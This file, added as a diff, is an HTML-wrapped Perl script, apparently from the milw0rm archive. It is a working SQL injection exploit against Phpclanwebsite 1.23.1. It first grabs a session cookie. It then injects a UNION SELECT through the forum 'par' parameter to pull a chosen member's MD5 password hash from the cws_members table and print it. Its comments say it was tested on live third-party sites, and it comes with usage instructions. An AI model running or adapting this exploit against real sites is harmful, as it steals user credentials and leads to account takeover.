@@ -1,0 +1,64 @@
+<html>
+<head>
+<title>Phpclanwebsite 1.23.1 (par) Remote SQL Injection Exploit</title>
+<pre>
+#!perl
+#Phpclanwebsite 1.23.1 SQL injection exploit by matrix_killer
+#Greets to all omega-team members[and specially to EcLiPsE] and also to h4cky0u[h4cky0u.org], Alpha-Fan, Chameleon and all my friends
+#The exploit was tested on phpclan's website and it worked + my local server and on ra4ev.com
+#But on versions below 1.23.1 it doesn't seem to work
+
+use IO::Socket;
+$host = $ARGV[0];
+$path = $ARGV[1];
+$topic = $ARGV[2];
+$id = $ARGV[3];
+
+if (@ARGV &lt; 4) {
+  print &quot;---------------------------------------------------------\n&quot;;
+  print &quot;-- Phpclanwebsite 1.23.1 SQL Injection sploit --\n&quot;;
+  print &quot;-- (C)oded by matrix_killer --\n&quot;;
+  print &quot;-- Contact: matrix_k\@abv.bg || matrix_killer\@ra4ev.com --\n&quot;;
+  print &quot;-- Usage: $0 [host] [path] [topic] [id] --\n&quot;;
+  print &quot;-- Ex: $0 127.0.0.1 cws 2 2 --\n&quot;;
+  print &quot;---------------------------------------------------------\n&quot;;
+  exit();
+}
+$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;) || die &quot;Can't establish a connection\n&quot;;
+
+print $sock &quot;GET /$path/index.php?page=forum&amp;func=post&amp;par=$topic HTTP/1.1\n&quot;;
+print $sock &quot;User-Agent: Mozilla/4.0\n&quot;;
+print $sock &quot;Host: $host\n\n&quot;;
+while ($asd = &lt;$sock&gt;) {
+        if ($asd =~ /Set-Cookie:/gi) {
+             $asd =~ /cuser_id=([a-zA-Z0-9]{32})/;
+             $cookie = $1;
+        }
+}
+$sock-&gt;close;
+
+$socket = IO::Socket::INET-&gt;new(PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;) || die &quot;Can't establish a connection\n&quot;;
+print &quot;-- Connection Established --\n&quot;;
+
+print $socket &quot;GET /$path/index.php?page=forum&amp;func=post&amp;par=$topic%20UNION%20SELECT%20null,null,null,null,null,null,password,null%20FROM%20cws_members%20WHERE%20member_id=$id/* HTTP/1.0\n&quot;;
+print $socket &quot;User-Agent: Mozilla/4.0\n&quot;;
+print $socket &quot;Host: $host\n&quot;;
+print $socket &quot;Cookie: cuser_id=$cookie; chitcounter=hitcounter\n\n&quot;;
+print &quot;-- Waiting... --\n&quot;;
+
+while($ans = &lt;$socket&gt;) {
+       if ($ans =~ /([a-zA-Z0-9]{32})/){
+            if ($ans =~ /cookie/i) {
+                 next;
+            }
+            print &quot;\nmember id: $id \n&quot;;
+            print &quot;md5 hash: $1 \n&quot;;
+            exit;
+       }
+}
+print &quot;Sorry there s33ms to be a problem\n&quot;;
+
+# milw0rm.com [2006-01-25]
+</pre>
+</html>
+
